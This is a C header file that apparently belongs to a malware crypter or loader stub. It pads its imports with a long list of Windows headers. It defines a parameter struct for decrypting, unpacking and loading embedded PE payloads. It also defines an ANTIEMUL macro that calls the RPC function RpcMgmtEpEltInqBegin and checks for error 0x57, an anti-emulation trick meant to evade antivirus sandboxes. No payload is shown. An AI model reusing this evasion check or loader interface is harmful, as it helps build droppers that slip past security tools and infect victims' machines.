
#pragma once

#include <windows.h>
#include <WinBase.h>
#include <stdio.h>
#include <OleDlg.h>
#include <Objbase.h>
#include <OleCtl.h>
#include <Commctrl.h>
#include <gl/gl.h>
#include <gl/glu.h>
#include <Shlwapi.h>
#include <Commctrl.h>
#include <wincrypt.h>
//#include <Sspi.h>
#include <Dsgetdc.h>
#include <Lm.h>
#include <Dbghelp.h>
#include <Aclui.h>
//#include <Adshlp.h>
#include <WinCred.h>
#include <Winscard.h>
#include <Wtsapi32.h>
#include <Vfw.h>
#include <Uxtheme.h>
#include <Usp10.h>
#include <Wingdi.h>
#include <Winsnmp.h>
#include <WPAPI.H>
#include <cryptuiapi.h>
#include <Windns.h>
#include <cfgmgr32.h>
#include <SetupAPI.h>
#include <Vfw.h>
#include <process.h>
//#include <Dsclient.h>
#include <Hlink.h>
#include <stdio.h>
#include <math.h>
#include <malloc.h>
#include <excpt.h>
#include <process.h>
#include <stdlib.h>
#include <io.h>
#include <crtdbg.h>
#include <time.h>
#include <assert.h>
#include <wchar.h>
#include <direct.h>
#include <conio.h> 
#include <mapiutil.h>
#include <Mapispi.h>
#include <Snmp.h>
#include <Mgmtapi.h>
#include <Mq.h>
#include <Icm.h>
#include <Ratings.h>

struct params_cb
{
    HINSTANCE   h_instance;
    BOOL        is_resource;
    BOOL        is_base64;
    BOOL        is_packed;
    void        *p_decryption_key;
    int         depacked_data_length;
    void        *p_pe_data_1;
    void        *p_pe_data_2;
    int         pe_data_size_1;
    int         pe_data_size_2;
};

typedef void *  (__stdcall *AEFUNC) (
    RPC_BINDING_HANDLE EpBinding,
    unsigned long      InquiryType,
    RPC_IF_ID          *IfId,
    unsigned long      VersOption,
    UUID               *ObjectUuid,
    RPC_EP_INQ_HANDLE  *InquiryContext
    );
typedef void  (__stdcall *LOADER2) (struct params_cb *params);

AEFUNC fnANTIEMUL;
LOADER2 loader2;

DWORD result;
RPC_EP_INQ_HANDLE hhh;

#define ANTIEMUL_LIB ("Rpcrt4.dll")
#define ANTIEMUL_FUNC ("RpcMgmtEpEltInqBegin")
#define ANTIEMUL() ( (result = fnANTIEMUL(0,RPC_C_EP_MATCH_BY_OBJ,0,RPC_C_VERS_ALL,0,&hhh)) && (result == 0x57) )
